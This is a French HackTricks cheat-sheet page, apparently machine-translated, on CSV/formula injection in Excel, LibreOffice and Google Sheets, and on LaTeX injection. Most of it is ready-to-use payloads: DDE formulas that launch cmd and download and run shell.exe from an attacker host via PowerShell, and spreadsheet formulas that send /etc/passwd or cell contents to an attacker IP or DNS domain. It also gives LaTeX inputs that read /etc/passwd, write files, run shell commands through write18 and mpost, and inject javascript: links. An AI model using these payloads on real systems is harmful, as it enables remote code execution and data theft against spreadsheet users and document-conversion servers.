# Injection de Formule/CSV/Doc/LaTeX/GhostScript

{% hint style="success" %}
Apprenez et pratiquez le Hacking AWS :<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**Formation HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Apprenez et pratiquez le Hacking GCP : <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**Formation HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Soutenir HackTricks</summary>

* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop) !
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez-nous sur** **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez des astuces de hacking en soumettant des PRs aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) d√©p√¥ts github.

</details>
{% endhint %}

## Injection de Formule

### Info

Si votre **entr√©e** est **r√©fl√©chie** √† l'int√©rieur des **fichiers CSV** (ou tout autre fichier qui sera probablement ouvert par **Excel**), vous pourrez peut-√™tre ins√©rer des **formules** Excel qui seront **ex√©cut√©es** lorsque l'utilisateur **ouvre le fichier** ou lorsque l'utilisateur **clique sur un lien** √† l'int√©rieur de la feuille Excel.

{% hint style="danger" %}
De nos jours, **Excel alertera** (plusieurs fois) l'**utilisateur lorsque quelque chose est charg√© depuis l'ext√©rieur d'Excel** afin de l'emp√™cher d'agir de mani√®re malveillante. Par cons√©quent, un effort sp√©cial en ing√©nierie sociale doit √™tre appliqu√© au payload final.
{% endhint %}

### [Liste de mots](https://github.com/payloadbox/csv-injection-payloads)
```
DDE ("cmd";"/C calc";"!A0")A0
@SUM(1+9)*cmd|' /C calc'!A0
=10+20+cmd|' /C calc'!A0
=cmd|' /C notepad'!'A1'
=cmd|'/C powershell IEX(wget attacker_server/shell.exe)'!A0
=cmd|'/c rundll32.exe \\10.0.0.1\3\2\1.dll,0'!_xlbgnm.A1
```
### Hyperlink

**L'exemple suivant est tr√®s utile pour exfiltrer du contenu de la feuille Excel finale et pour effectuer des requ√™tes vers des emplacements arbitraires. Mais cela n√©cessite que l'utilisateur clique sur le lien (et accepte les avertissements).**

L'exemple suivant a √©t√© tir√© de [https://payatu.com/csv-injection-basic-to-exploit](https://payatu.com/csv-injection-basic-to-exploit)

Imaginez qu'une violation de s√©curit√© dans un syst√®me de gestion des dossiers √©tudiants soit exploit√©e par une attaque par injection CSV. L'intention principale de l'attaquant est de compromettre le syst√®me utilis√© par les enseignants pour g√©rer les d√©tails des √©tudiants. La m√©thode implique que l'attaquant injecte une charge utile malveillante dans l'application, en entrant sp√©cifiquement des formules nuisibles dans des champs destin√©s aux d√©tails des √©tudiants. L'attaque se d√©roule comme suit :

1. **Injection de la Charge Utile Malveillante :**
* L'attaquant soumet un formulaire de d√©tails d'√©tudiant mais inclut une formule couramment utilis√©e dans les tableurs (par exemple, `=HYPERLINK("<malicious_link>","Cliquez ici")`).
* Cette formule est con√ßue pour cr√©er un hyperlien, mais elle pointe vers un serveur malveillant contr√¥l√© par l'attaquant.
2. **Exportation des Donn√©es Compromises :**
* Les enseignants, inconscients de la compromission, utilisent la fonctionnalit√© de l'application pour exporter les donn√©es dans un fichier CSV.
* Le fichier CSV, une fois ouvert, contient toujours la charge utile malveillante. Cette charge utile appara√Æt comme un hyperlien cliquable dans le tableur.
3. **D√©clenchement de l'Attaque :**
* Un enseignant clique sur l'hyperlien, croyant qu'il fait partie des d√©tails l√©gitimes de l'√©tudiant.
* En cliquant, des donn√©es sensibles (potentiellement y compris des d√©tails du tableur ou de l'ordinateur de l'enseignant) sont transmises au serveur de l'attaquant.
4. **Enregistrement des Donn√©es :**
* Le serveur de l'attaquant re√ßoit et enregistre les donn√©es sensibles envoy√©es depuis l'ordinateur de l'enseignant.
* L'attaquant peut alors utiliser ces donn√©es √† diverses fins malveillantes, compromettant davantage la vie priv√©e et la s√©curit√© des √©tudiants et de l'institution.

### RCE

**V√©rifiez le** [**post original**](https://notsosecure.com/data-exfiltration-formula-injection-part1) **pour plus de d√©tails.**

Dans des configurations sp√©cifiques ou des versions plus anciennes d'Excel, une fonctionnalit√© appel√©e Dynamic Data Exchange (DDE) peut √™tre exploit√©e pour ex√©cuter des commandes arbitraires. Pour en tirer parti, les param√®tres suivants doivent √™tre activ√©s :

* Allez dans Fichier ‚Üí Options ‚Üí Centre de gestion de la confidentialit√© ‚Üí Param√®tres du Centre de gestion de la confidentialit√© ‚Üí Contenu externe, et activez **Lancement du serveur Dynamic Data Exchange**.

Lorsqu'un tableur avec la charge utile malveillante est ouvert (et si l'utilisateur accepte les avertissements), la charge utile est ex√©cut√©e. Par exemple, pour lancer l'application calculatrice, la charge utile serait :
```markdown
=cmd|' /C calc'!xxx
```
Des commandes suppl√©mentaires peuvent √©galement √™tre ex√©cut√©es, telles que le t√©l√©chargement et l'ex√©cution d'un fichier √† l'aide de PowerShell :
```bash
=cmd|' /C powershell Invoke-WebRequest "http://www.attacker.com/shell.exe" -OutFile "$env:Temp\shell.exe"; Start-Process "$env:Temp\shell.exe"'!A1
```
### Inclusion de Fichiers Locaux (LFI) dans LibreOffice Calc

LibreOffice Calc peut √™tre utilis√© pour lire des fichiers locaux et exfiltrer des donn√©es. Voici quelques m√©thodes :

* Lire la premi√®re ligne du fichier local `/etc/passwd` : `='file:///etc/passwd'#$passwd.A1`
* Exfiltrer les donn√©es lues vers un serveur contr√¥l√© par l'attaquant : `=WEBSERVICE(CONCATENATE("http://<attacker IP>:8080/",('file:///etc/passwd'#$passwd.A1)))`
* Exfiltrer plus d'une ligne : `=WEBSERVICE(CONCATENATE("http://<attacker IP>:8080/",('file:///etc/passwd'#$passwd.A1)&CHAR(36)&('file:///etc/passwd'#$passwd.A2)))`
* Exfiltration DNS (envoi des donn√©es lues sous forme de requ√™tes DNS √† un serveur DNS contr√¥l√© par l'attaquant) : `=WEBSERVICE(CONCATENATE((SUBSTITUTE(MID((ENCODEURL('file:///etc/passwd'#$passwd.A19)),1,41),"%","-")),".<attacker domain>"))`

### Google Sheets pour l'Exfiltration de Donn√©es Hors-Bande (OOB)

Google Sheets propose des fonctions qui peuvent √™tre exploit√©es pour l'exfiltration de donn√©es OOB :

* **CONCATENATE** : Concat√®ne des cha√Ænes - `=CONCATENATE(A2:E2)`
* **IMPORTXML** : Importe des donn√©es √† partir de types de donn√©es structur√©es - `=IMPORTXML(CONCAT("http://<attacker IP:Port>/123.txt?v=", CONCATENATE(A2:E2)), "//a/a10")`
* **IMPORTFEED** : Importe des flux RSS ou ATOM - `=IMPORTFEED(CONCAT("http://<attacker IP:Port>//123.txt?v=", CONCATENATE(A2:E2)))`
* **IMPORTHTML** : Importe des donn√©es √† partir de tables ou de listes HTML - `=IMPORTHTML (CONCAT("http://<attacker IP:Port>/123.txt?v=", CONCATENATE(A2:E2)),"table",1)`
* **IMPORTRANGE** : Importe une plage de cellules d'une autre feuille de calcul - `=IMPORTRANGE("https://docs.google.com/spreadsheets/d/[Sheet_Id]", "sheet1!A2:E2")`
* **IMAGE** : Ins√®re une image dans une cellule - `=IMAGE("https://<attacker IP:Port>/images/srpr/logo3w.png")`

## Injection LaTeX

En g√©n√©ral, les serveurs que l'on trouve sur Internet qui **convertissent le code LaTeX en PDF** utilisent **`pdflatex`**.\
Ce programme utilise 3 attributs principaux pour (d√©s)autoriser l'ex√©cution de commandes :

* **`--no-shell-escape`** : **D√©sactive** la construction `\write18{command}`, m√™me si elle est activ√©e dans le fichier texmf.cnf.
* **`--shell-restricted`** : Identique √† `--shell-escape`, mais **limit√©** √† un ensemble 's√ªr' de **commandes pr√©d√©finies** (**Sur Ubuntu 16.04, la liste se trouve dans `/usr/share/texmf/web2c/texmf.cnf`).
* **`--shell-escape`** : **Active** la construction `\write18{command}`. La commande peut √™tre n'importe quelle commande shell. Cette construction est normalement interdite pour des raisons de s√©curit√©.

Cependant, il existe d'autres moyens d'ex√©cuter des commandes, donc pour √©viter RCE, il est tr√®s important d'utiliser `--shell-restricted`.

### Lire le fichier <a href="#read-file" id="read-file"></a>

Vous pourriez avoir besoin d'ajuster l'injection avec des wrappers comme \[ ou $.
```bash
\input{/etc/passwd}
\include{password} # load .tex file
\lstinputlisting{/usr/share/texmf/web2c/texmf.cnf}
\usepackage{verbatim}
\verbatiminput{/etc/passwd}
```
#### Lire un fichier √† une seule ligne
```bash
\newread\file
\openin\file=/etc/issue
\read\file to\line
\text{\line}
\closein\file
```
#### Lire un fichier √† plusieurs lignes
```bash
\newread\file
\openin\file=/etc/passwd
\loop\unless\ifeof\file
\read\file to\fileline
\text{\fileline}
\repeat
\closein\file
```
### √âcrire un fichier <a href="#write-file" id="write-file"></a>
```bash
\newwrite\outfile
\openout\outfile=cmd.tex
\write\outfile{Hello-world}
\closeout\outfile
```
### Ex√©cution de commande <a href="#command-execution" id="command-execution"></a>

L'entr√©e de la commande sera redirig√©e vers stdin, utilisez un fichier temporaire pour l'obtenir.
```bash
\immediate\write18{env > output}
\input{output}

\input{|"/bin/hostname"}
\input{|"extractbb /etc/passwd > /tmp/b.tex"}

# allowed mpost command RCE
\documentclass{article}\begin{document}
\immediate\write18{mpost -ini "-tex=bash -c (id;uname${IFS}-sm)>/tmp/pwn" "x.mp"}
\end{document}

# If mpost is not allowed there are other commands you might be able to execute
## Just get the version
\input{|"bibtex8 --version > /tmp/b.tex"}
## Search the file pdfetex.ini
\input{|"kpsewhich pdfetex.ini > /tmp/b.tex"}
## Get env var value
\input{|"kpsewhich -expand-var=$HOSTNAME > /tmp/b.tex"}
## Get the value of shell_escape_commands without needing to read pdfetex.ini
\input{|"kpsewhich --var-value=shell_escape_commands > /tmp/b.tex"}
```
Si vous obtenez une erreur LaTex, envisagez d'utiliser base64 pour obtenir le r√©sultat sans mauvais caract√®res.
```bash
\immediate\write18{env | base64 > test.tex}
\input{text.tex}
```

```bash
\input|ls|base4
\input{|"/bin/hostname"}
```
### Cross Site Scripting <a href="#cross-site-scripting" id="cross-site-scripting"></a>

De [@EdOverflow](https://twitter.com/intigriti/status/1101509684614320130)
```bash
\url{javascript:alert(1)}
\href{javascript:alert(1)}{placeholder}
```
## Injection Ghostscript

**V√©rifiez** [**https://blog.redteam-pentesting.de/2023/ghostscript-overview/**](https://blog.redteam-pentesting.de/2023/ghostscript-overview/)

## R√©f√©rences

* [https://notsosecure.com/data-exfiltration-formula-injection-part1](https://notsosecure.com/data-exfiltration-formula-injection-part1)
* [https://0day.work/hacking-with-latex/](https://0day.work/hacking-with-latex/)
* [https://salmonsec.com/cheatsheet/latex\_injection](https://salmonsec.com/cheatsheet/latex\_injection)
* [https://scumjr.github.io/2016/11/28/pwning-coworkers-thanks-to-latex/](https://scumjr.github.io/2016/11/28/pwning-coworkers-thanks-to-latex/)


{% hint style="success" %}
Apprenez et pratiquez le hacking AWS :<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Apprenez et pratiquez le hacking GCP : <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Soutenir HackTricks</summary>

* V√©rifiez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop) !
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** nous sur **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez des astuces de hacking en soumettant des PRs aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) d√©p√¥ts github.

</details>
{% endhint %}
